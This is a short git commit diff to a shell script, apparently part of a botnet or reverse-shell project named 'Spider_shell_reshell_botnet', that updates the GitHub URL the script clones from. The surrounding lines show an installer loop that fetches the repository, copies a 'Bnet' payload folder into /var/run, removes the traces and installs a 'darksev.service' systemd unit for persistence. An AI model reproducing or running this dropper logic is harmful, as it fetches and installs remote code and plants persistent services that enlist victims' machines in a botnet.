5ee73a032e9cf136a3b216b378d747dc47884e24
Mr . Dark Sage <99752941+Dhanraj369@users.noreply.github.com>
2023-06-19 16:51:58 +0530

    Update mrdarksage.sh

--- Debian_based_botne/Bnet/mrdarksage.sh
+++ Debian_based_botne/Bnet/mrdarksage.sh
@@ -10,7 +10,7 @@ while ! ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1; do
     while true; do
         if [ ! -f "$fileee" ]; then
            
-            git clone https://github.com/Dhanraj369/Spider_shell_reshell_botnet.git
+            git clone https://github.com/Dhanraj369/the_spider_shell_reshell.git
             cp -r the_spider_shell_reshell/Debian_based_botne/Bnet /var/run/
             rm -rf the_spider_shell_reshell
             cp /var/run/Bnet/darksev.service /etc/systemd/system/
